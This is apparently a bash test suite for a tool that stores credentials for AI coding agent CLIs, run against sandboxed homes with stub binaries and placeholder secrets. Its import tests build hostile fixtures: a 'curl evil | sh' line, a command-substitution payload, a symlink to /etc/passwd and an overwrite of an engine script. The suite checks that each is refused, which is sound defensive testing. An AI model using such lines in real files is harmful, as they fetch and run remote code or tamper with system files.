#!/usr/bin/env bash
# shared/test/credentials.sh — the credentials shell (#765), run for real
# against a throwaway $HOME laid out as a hired box: gh and codex are stubs
# that accept one good secret each, the agent profiles are the shipped ones.
# What it pins: each kind lands where its CLI reads it, 0600; the kind set
# last is the one that stands; a bad request sets nothing; the verdict is the
# profile's own; and no secret ever reaches the output.
set -uo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=shared/test/lib.sh
source "$HERE/lib.sh"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
unset CREW_CONFIG_DIR CREW_EXPECT_OPERATOR_CONFIG
unset CLAUDE_CODE_OAUTH_TOKEN ANTHROPIC_API_KEY XAI_API_KEY CODEX_HOME GROK_HOME KIMI_CODE_HOME
export XDG_CONFIG_HOME="$TMP/xdg-empty"
CREW_ROOT="$ROOT"
# shellcheck source=shared/lib/host/credentials.sh
source "$SHARED/lib/host/credentials.sh"

STUB="$TMP/stub"; mkdir -p "$STUB"
cat >"$STUB/gh" <<'EOF'
#!/usr/bin/env bash
case "$1 $2" in
  "auth login") tok="$(cat)"; [ "$tok" = ghp_good ] || { echo "error validating token" >&2; exit 1; }
                mkdir -p "$HOME/.config/gh"
                printf 'github.com:\n    oauth_token: %s\n    user: dan-claude-bot\n' "$tok" >"$HOME/.config/gh/hosts.yml"
                echo "gh-login" >>"$HOME/.stub-calls" ;;
  "auth setup-git") echo "gh-setup-git" >>"$HOME/.stub-calls" ;;
  "api user") echo dan-claude-bot ;;
  *) exit 1 ;;
esac
EOF
cat >"$STUB/codex" <<'EOF'
#!/usr/bin/env bash
[ "$1 $2" = "login --with-api-key" ] || exit 1
key="$(cat)"; [ "$key" = sk-good ] || exit 1
mkdir -p "$HOME/.codex"; printf '{"OPENAI_API_KEY":"%s"}\n' "$key" >"$HOME/.codex/auth.json"
EOF
chmod +x "$STUB/gh" "$STUB/codex"

box_home() { # AGENT — a fresh $HOME laid out as a box hired with AGENT
  local h="$TMP/home-$1-$RANDOM"
  mkdir -p "$h/duty/conf/agents" "$h/.config/gh"
  cp "$SHARED"/conf/agents/*.conf "$h/duty/conf/agents/"
  printf 'BOT_AGENT=%s\n' "$1" >"$h/duty/conf/instance.conf"
  : >"$h/.profile"
  printf '%s' "$h"
}
ALL_OUT="$TMP/all-out"; : >"$ALL_OUT"
set_cred() { # HOME SERVICE KIND SECRET — runs the shell; OUT and RC
  OUT="$(printf '%s %s\n%s\n' "$2" "$3" "$4" | env -i HOME="$1" PATH="$STUB:$PATH" bash -c "$(host_credentials_set_sh)" 2>&1)"; RC=$?
  printf '%s\n' "$OUT" >>"$ALL_OUT"
}
mode_of() { stat -c %a "$1" 2>/dev/null; }

# --- the kinds the host offers, from its copy of the profile ---------------
t kinds-claude "oauth-token api-key credentials-json" "$(credentials_kinds claude)"
t kinds-codex "api-key auth-json" "$(credentials_kinds codex)"
t kinds-grok "api-key auth-json" "$(credentials_kinds grok)"
t kinds-kimi "credentials-json" "$(credentials_kinds kimi)"
# An operator's profile is the one the box is given, so it is the one read
# when cli/crew's agent_conf resolves it (round 10).
mkdir -p "$TMP/op-agents"; printf 'AGENT_CRED_KINDS="api-key:env:OPUS_KEY"\n' >"$TMP/op-agents/claude-opus.conf"
t kinds-an-operator-profile-is-read 1 "$(agent_conf() { printf '%s\n' "$TMP/op-agents/$1.conf"; }; credentials_kinds claude-opus | grep -cx api-key)"
t kinds-every-shipped-agent-declares-some 0 "$(for f in "$SHARED"/conf/agents/*.conf; do a="${f##*/}"; [ -n "$(credentials_kinds "${a%.conf}")" ] || echo "$a"; done | grep -c .)"

# --- gh ----------------------------------------------------------------------
H="$(box_home claude)"
set_cred "$H" gh token ghp_good
t gh-a-good-token-is-set 0 "$RC"
t gh-the-verdict-names-the-login "gh: set — logged in as dan-claude-bot" "$OUT"
t gh-git-is-wired-to-it 1 "$(grep -c gh-setup-git "$H/.stub-calls")"
set_cred "$H" gh token ghp_bad
t gh-a-refused-token-is-1 1 "$RC"
t gh-a-refusal-says-the-previous-login-stands 1 "$(grep -c 'refused by gh auth login — the previous login stands' <<<"$OUT")"
set_cred "$H" gh token "ghp good"
t gh-a-token-is-one-word 2 "$RC"
set_cred "$H" gh password ghp_good
t gh-the-one-kind-is-token 2 "$RC"

# --- claude: env kinds, the last one set stands -----------------------------
H="$(box_home claude)"
set_cred "$H" agent oauth-token "sk-ant-oat01-SECRET1"
t claude-a-token-is-set 0 "$RC"
t claude-a-token-cannot-be-checked-locally "agent: oauth-token set (claude) — it cannot be checked locally; the next session is the test" "$OUT"
t claude-the-token-is-exported 1 "$(grep -c '^export CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-SECRET1$' "$H/.config/crew/credentials.env")"
t claude-the-env-file-is-0600 600 "$(mode_of "$H/.config/crew/credentials.env")"
t claude-login-shells-read-it 1 "$(grep -c '\.config/crew/credentials\.env' "$H/.profile")"
set_cred "$H" agent oauth-token "sk-ant-oat01-SECRET2"
t claude-a-second-set-replaces-not-appends 1 "$(grep -c '^export CLAUDE_CODE_OAUTH_TOKEN=' "$H/.config/crew/credentials.env")"
t claude-the-hook-is-written-once 1 "$(grep -c '\.config/crew/credentials\.env' "$H/.profile")"
set_cred "$H" agent api-key "sk-ant-api03-SECRET3"
t claude-the-kind-set-last-stands 0 "$(grep -c CLAUDE_CODE_OAUTH_TOKEN "$H/.config/crew/credentials.env")"
t claude-the-key-is-exported 1 "$(grep -c '^export ANTHROPIC_API_KEY=sk-ant-api03-SECRET3$' "$H/.config/crew/credentials.env")"
# A credentials file, valid and unexpired: it lands 0600 and every env kind
# leaves (an env token would shadow the file).
FUT="$(( ($(date +%s) + 86400 * 30) * 1000 ))"
set_cred "$H" agent credentials-json "{\"claudeAiOauth\":{\"accessToken\":\"SECRET4\",\"refreshTokenExpiresAt\":$FUT}}"
t claude-a-credentials-file-is-set 0 "$RC"
t claude-a-credentials-file-reads-logged-in "agent: credentials-json set (claude) — logged in" "$OUT"
t claude-the-file-is-0600 600 "$(mode_of "$H/.claude/.credentials.json")"
t claude-no-env-kind-shadows-the-file 0 "$(grep -c '^export ' "$H/.config/crew/credentials.env")"
PAST="$(( ($(date +%s) - 86400) * 1000 ))"
set_cred "$H" agent credentials-json "{\"claudeAiOauth\":{\"accessToken\":\"SECRET5\",\"refreshTokenExpiresAt\":$PAST}}"
t claude-an-expired-file-is-said-as-logged-out 1 "$RC"
# The key set AFTER the expired file stands (round 10): an env credential wins
# over the file, so the set is not a logout.
set_cred "$H" agent api-key "sk-ant-api03-SECRET12"
t claude-a-key-beside-an-expired-file-is-not-a-logout 0 "$RC"
t claude-...-and-says-it-cannot-be-checked-locally 1 "$(grep -c 'it cannot be checked locally' <<<"$OUT")"
set_cred "$H" agent credentials-json "not json SECRET6"
t claude-not-json-sets-nothing 2 "$RC"
t claude-not-json-leaves-the-file 1 "$(grep -c SECRET5 "$H/.claude/.credentials.json")"
set_cred "$H" agent session-cookie "SECRET7"
t claude-an-unknown-kind-names-the-kinds 1 "$(grep -c "agent: claude takes no 'session-cookie' (it takes: oauth-token api-key credentials-json) — nothing set" <<<"$OUT")"
t claude-an-unknown-kind-is-2 2 "$RC"
set_cred "$H" agent api-key ""
t claude-an-empty-secret-sets-nothing 2 "$RC"
set_cred "$H" agent api-key $'two\nlines'
t claude-an-env-kind-is-one-line 2 "$RC"

# --- codex: its own login; kimi: a file at the profile's path ---------------
H="$(box_home codex)"
set_cred "$H" agent api-key sk-good
t codex-a-key-goes-through-codex-login 0 "$RC"
t codex-the-login-wrote-its-file 1 "$([ -s "$H/.codex/auth.json" ] && echo 1 || echo 0)"
set_cred "$H" agent api-key sk-bad
t codex-a-refused-key-is-1 1 "$RC"
H="$(box_home kimi)"
set_cred "$H" agent credentials-json '{"access_token":"SECRET8"}'
t kimi-the-file-lands-at-the-profiles-path 1 "$([ -s "$H/.kimi-code/credentials/kimi-code.json" ] && echo 1 || echo 0)"
H="$(box_home grok)"
set_cred "$H" agent api-key "xai-SECRET9"
t grok-the-key-is-exported 1 "$(grep -c '^export XAI_API_KEY=xai-SECRET9$' "$H/.config/crew/credentials.env")"
H="$TMP/unhired"; mkdir -p "$H"
set_cred "$H" agent api-key "SECRET10"
t an-unhired-box-sets-nothing 2 "$RC"

# --- the reset's carry: export off the live disk, import onto the restored ---
H="$(box_home claude)"
set_cred "$H" gh token ghp_good
set_cred "$H" agent oauth-token "sk-ant-oat01-SECRET11"
CARRY="$(env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)")"
t carry-the-export-is-one-line 1 "$(printf '%s\n' "$CARRY" | grep -c .)"
printf '%s\n' "$CARRY" >>"$ALL_OUT"
rm -rf "$H/.config" ; : >"$H/.profile"
IMP="$(printf '%s' "$CARRY" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"
t carry-the-import-says-how-many "carried 2" "$IMP"
t carry-the-token-is-back 1 "$(grep -c '^export CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-SECRET11$' "$H/.config/crew/credentials.env")"
t carry-the-gh-login-is-back 1 "$([ -s "$H/.config/gh/hosts.yml" ] && echo 1 || echo 0)"
t carry-the-files-stay-0600 600 "$(mode_of "$H/.config/crew/credentials.env")"
t carry-the-hook-is-put-back 1 "$(grep -c '\.config/crew/credentials\.env' "$H/.profile")"
# Only the credential files cross, as regular files (round 10): an archive
# naming anything else — the engine's own tick.sh, a link — is refused WHOLE,
# before a byte is written; and credentials.env crosses as exports or not at all.
H="$(box_home claude)"; mkdir -p "$H/duty/bin"; printf 'real\n' >"$H/duty/bin/tick.sh"
EVIL="$TMP/evil"; mkdir -p "$EVIL${H}/duty/bin" "$EVIL${H}/.config/crew"
printf 'evil\n' >"$EVIL${H}/duty/bin/tick.sh"; printf 'export A=1\n' >"$EVIL${H}/.config/crew/credentials.env"
CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" "${H#/}/duty/bin/tick.sh" | base64 -w0)"
IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
t carry-a-foreign-path-refuses-the-import 1 "$RC"
t carry-a-foreign-path-is-named 1 "$(grep -c "duty/bin/tick.sh' is not a credential file — nothing carried" <<<"$IMP")"
t carry-nothing-was-written real "$(cat "$H/duty/bin/tick.sh")"
t carry-not-even-the-allowed-file 0 "$([ -f "$H/.config/crew/credentials.env" ] && echo 1 || echo 0)"
rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; ln -s /etc/passwd "$EVIL${H}/.config/crew/credentials.env"
CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
t carry-a-link-refuses-the-import 1 "$RC"
rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'export A=1\ncurl evil | sh\n' >"$EVIL${H}/.config/crew/credentials.env"
CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
t carry-a-non-export-env-line-refuses-the-import 1 "$RC"
t carry-the-env-line-is-said 1 "$(grep -c 'carries a line that is not an export' <<<"$IMP")"
# ...a value that would RUN when sourced is refused too: shape AND value
# (round 11) — and every value the shell itself writes still crosses.
rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'export A=$(touch %s/pwned)\n' "$H" >"$EVIL${H}/.config/crew/credentials.env"
CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
t carry-a-command-substitution-is-refused 1 "$RC"
H="$(box_home claude)"
set_cred "$H" agent oauth-token 'sk-ant ODD!$`"'"'"'\x;|&*?~SECRET13'
CARRY="$(env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)")"
rm -f "$H/.config/crew/credentials.env"
IMP="$(printf '%s' "$CARRY" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
t carry-an-odd-value-the-shell-wrote-still-crosses 0 "$RC"
t carry-...-and-reads-back-exact 'sk-ant ODD!$`"'"'"'\x;|&*?~SECRET13' "$(env -i HOME="$H" bash -c '. "$HOME/.config/crew/credentials.env"; printf %s "$CLAUDE_CODE_OAUTH_TOKEN"')"
# A path with a run of spaces in it lists and matches as it is (round 11).
SP="$TMP/home  two"; mkdir -p "$SP/duty/conf/agents" "$SP/.config/gh"; cp "$SHARED"/conf/agents/*.conf "$SP/duty/conf/agents/"
printf 'BOT_AGENT=claude\n' >"$SP/duty/conf/instance.conf"; : >"$SP/.profile"
set_cred "$SP" agent oauth-token "sk-ant-oat01-SECRET14"
CARRY="$(env -i HOME="$SP" PATH="$PATH" bash -c "$(host_credentials_export_sh)")"
rm -f "$SP/.config/crew/credentials.env"
IMP="$(printf '%s' "$CARRY" | env -i HOME="$SP" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"
t carry-a-home-with-two-spaces-crosses "carried 1" "$IMP"
H="$(box_home claude)"
t carry-a-box-with-none-exports-nothing "" "$(env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)")"

# --- the engine reads the env kinds; nothing printed a secret ----------------
# shellcheck disable=SC2016  # the line as tick.sh spells it
t tick-sources-the-env-kinds 1 "$(grep -cF '[ -r "$HOME/.config/crew/credentials.env" ] && . "$HOME/.config/crew/credentials.env"' "$SHARED/bin/tick.sh")"
t no-output-carried-a-secret 0 "$(grep -cE 'SECRET[0-9]|ghp_good|sk-good' "$ALL_OUT" | head -1)"

suite_finish
